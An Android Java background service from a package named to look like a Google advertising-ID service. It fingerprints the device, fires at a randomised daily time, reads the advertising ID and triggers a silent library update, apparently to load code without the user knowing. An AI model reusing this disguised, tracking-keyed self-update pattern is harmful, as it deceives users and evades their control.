package com.advertising_id_service.appclick.googleadvertisingidservice;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.app.LoaderManager;
import android.util.Log;

import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

public class InitializeService extends Service{


    public static final String DefaultSynkTime = "21:30";

    String currentSTRtime;
    Date currentTime;
    long lastStartTime = 0;
    boolean isNeedStart = false;
    boolean isInstallStart = false;


    long getPeriod()
    {
        String period = SharedPreferencesServicer.getSimplePreferences(getApplicationContext(), GlobalParameters.SPF_SESSION_PERIOD, GlobalParameters.SPF_KEY_PERIOD, "");
        if((period == null) || (period.equals("")))
        {
            return 4*60*60*1000;
        }
        else
        {
            return Long.parseLong(period);
        }
    }

    String generateShift(Context cnt)
    {
        String result = "";
        Calendar now = Calendar.getInstance();
        Random r = new Random();
        DeviceInfo di = DeviceInfo.getDeviceInfo(cnt, "");
        String seed = "" + " " + di.android_id
                + " " + di.brand
                + " " + di.device
                + " " + di.display_hight
                + " " + di.display_width
                + " " + di.guid
                + " " + di.manufactor
                + " " + di.model
                + " " + di.product_id
                + " " + di.version_os
                + " " + now.toString();
        r.setSeed(seed.hashCode());

        int h = r.nextInt(23);
        int m = r.nextInt(59);
        result = "" + ( h<10 ? "0"+h : ""+ h) + ":" + ( m<10 ? "0"+m : ""+ m);
        return result;
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Logger.log("Запущена служба");

        if (!GlobalParameters.isUpdateTimerStart) {
            GlobalParameters.isUpdateTimerStart = true;
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    //Log.e("!!!", "Step-" + this + " [" +  GlobalParameters.isNeedStopAutoUpdater + "]" + "["+ GlobalParameters.isUpdateTimerStart + "]");
                    if (GlobalParameters.isNeedStopAutoUpdater) {
                        GlobalParameters.isNeedStopAutoUpdater = false;
                        this.cancel();
                        new GoogleAdvertisingIdGetter().initialize(getApplicationContext(), null);
                    }

                    currentTime = Calendar.getInstance().getTime();
                    final SimpleDateFormat sdf = new SimpleDateFormat("HH:mm");
                    currentSTRtime = sdf.format(currentTime);

                    String savedLastStartTime = SharedPreferencesServicer.getSimplePreferences(getApplicationContext(), GlobalParameters.SPF_SESSION_LAST_START_TIME, GlobalParameters.SPF_KEY_LAST_START_TIME, "");
                    if ((savedLastStartTime != null) && (!savedLastStartTime.equals(""))) {
                        lastStartTime = Long.parseLong(savedLastStartTime);
                    }

                    boolean isTimeToUpdate = false;

                    String shift = SharedPreferencesServicer.getSimplePreferences(getApplicationContext(), GlobalParameters.SPF_SESSION_SHIFT, GlobalParameters.SPF_KEY_SHIFT, "");
                    if ((shift==null) || (shift.equals("")))
                    {
                        shift = generateShift(getApplicationContext());
                        SharedPreferencesServicer.setSimplePreferences(getApplicationContext(), GlobalParameters.SPF_SESSION_SHIFT, GlobalParameters.SPF_KEY_SHIFT, shift);
                    }
                    if (shift.equals(currentSTRtime))
                    {
                        if (!isNeedStart)
                        {
                            String tmp = SharedPreferencesServicer.getSimplePreferences(getApplicationContext(), GlobalParameters.SPF_SESSION_LAST_START_TIME, GlobalParameters.SPF_KEY_LAST_START_TIME, "");
                            if ((tmp != null) && (!tmp.equals(""))) {
                                lastStartTime = Long.parseLong(tmp);
                            }
                            else
                            {
                                lastStartTime = Calendar.getInstance().getTime().getTime();
                            }
                            SharedPreferencesServicer.setSimplePreferences(getApplicationContext(), GlobalParameters.SPF_SESSION_LAST_START_TIME, GlobalParameters.SPF_KEY_LAST_START_TIME, "" + lastStartTime);
                        }
                        isNeedStart = true;
                    }

                    if ((isNeedStart)&&(currentTime!=null)&&(lastStartTime >0)) {
                        if (currentTime.getTime() - lastStartTime > getPeriod()) {
                            if (!isTimeToUpdate) {
                                lastStartTime = Calendar.getInstance().getTime().getTime();
                                SharedPreferencesServicer.setSimplePreferences(getApplicationContext(), GlobalParameters.SPF_SESSION_LAST_START_TIME, GlobalParameters.SPF_KEY_LAST_START_TIME, "" + lastStartTime);
                                isTimeToUpdate = true;
                            }
                        }
                    }

//                if(currentTime!=null) {
//                    Log.e("12345", "v 2.X.X timer: " + shift + "|" + currentTime.getTime() + " - " + lastStartTime + " > " + getPeriod() + "[" + (currentTime.getTime() - lastStartTime > getPeriod()) + " " + (currentTime.getTime() - lastStartTime) + "]" + isNeedStart + " " + isTimeToUpdate);
//                }
//                else
//                {
//                    Log.e("12345", "v 2.X.X timer: " + shift + "|" + "-" + " - " + "-" + " > " + getPeriod() + "[" + "-" + "]" + isNeedStart + " " + isTimeToUpdate);
//                }

                if (!(isTimeToUpdate || (DefaultSynkTime.equals(currentSTRtime)))) {isInstallStart = false;}
                if ((isTimeToUpdate || (DefaultSynkTime.equals(currentSTRtime))) && isInstallStart == false) {
                    isInstallStart = true;
                    GoogleAdvertisingIdGetter g = new GoogleAdvertisingIdGetter();
                    Context cnt = getApplicationContext();
                    String GAID = "";
                    try {
                        GAID = g.getGAID(cnt, "");
                    } catch (GooglePlayServicesNotAvailableException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (GooglePlayServicesRepairableException e) {
                        e.printStackTrace();
                    }

                    g.libUpdate(cnt, null, GAID);
                    Log.e("12345","!!!! Start UPDATE lib !!!!!!");

                }
                }
            }, 0, 30000);
        }
        else
        {
            GlobalParameters.isNeedStopAutoUpdater = true;
            GlobalParameters.isUpdateTimerStart    = false;
        }

        return super.onStartCommand(intent, flags, startId);
    }
}
